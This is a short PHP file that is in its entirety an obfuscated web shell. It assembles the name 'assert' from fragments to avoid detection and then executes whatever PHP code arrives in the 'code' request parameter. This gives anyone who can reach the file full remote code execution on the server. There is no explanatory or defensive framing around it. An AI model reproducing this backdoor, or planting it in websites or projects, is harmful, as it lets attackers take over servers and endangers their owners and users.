
<?php
    $a = '_GET';
    $b = $$a;
    $a = 'ass'.'ert';
    $a('$code=function() {'.$_REQUEST['code'].'}');
    $code();
?>
